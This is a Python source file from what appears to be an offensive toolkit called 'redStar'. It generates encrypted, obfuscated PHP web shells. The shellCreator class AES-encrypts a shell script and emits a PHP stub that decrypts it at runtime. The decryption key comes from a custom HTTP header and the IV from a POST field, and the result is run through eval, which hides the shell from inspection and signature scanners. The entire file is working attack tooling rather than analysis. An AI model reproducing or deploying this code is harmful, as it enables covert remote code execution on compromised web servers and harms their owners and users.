import base64
import hashlib
from binascii import *
from Crypto.Cipher import AES
from Crypto import Random

 







class shellCreator:
 
	def customShell(key):
		f = open("redStar/phpWebShell/customShell.php")
		shelle = f.read()
		shell  = shellCreator.encrypt("",shelle,key)
		xA = "<?php" + "\n"
		xA = xA + "$a=\"" + str(shell.decode("utf-8")) + "\";\n"
		xA = xA + '''eval("?>".substr(openssl_decrypt(base64_decode($a),"AES-256-CBC",$_SERVER['HTTP_REDSTAR'],OPENSSL_RAW_DATA,substr(base64_decode($_POST['redStar']),0,16)),16));'''
		return xA
	 

	def encrypt(self,data,key):
		enc = AESCipher(key)
		return enc.encrypt(data)

	def decrypt(self,data,key):
		dec = AESCipher(key)
		return dec.decrypt(data)


 
class AESCipher(object):
	key=""
	def __init__(self, key): 
		result = hashlib.md5(key.encode()) 
		for x in range(1,100000):
			result = hashlib.md5(result.hexdigest().encode()) 
		self.bs = 16
		self.key = result.hexdigest().encode()#hashlib.sha256(key.encode()).digest()

 
	def encrypt(self, raw):
		raw = self._pad(raw)
		iv = Random.new().read(AES.block_size)
		cipher = AES.new(self.key, AES.MODE_CBC, iv)
		return base64.b64encode(iv + cipher.encrypt(raw.encode()))

	def decrypt(self, enc):
		enc = base64.b64decode(enc)
		iv = enc[:AES.block_size]
		cipher = AES.new(self.key, AES.MODE_CBC, iv)
		return self._unpad(cipher.decrypt(enc[AES.block_size:])).decode('utf-8')

	def _pad(self, s):
		return s + (self.bs - len(s) % self.bs) * chr(self.bs - len(s) % self.bs)

	@staticmethod
	def _unpad(s):
		return s[:-ord(s[len(s)-1:])]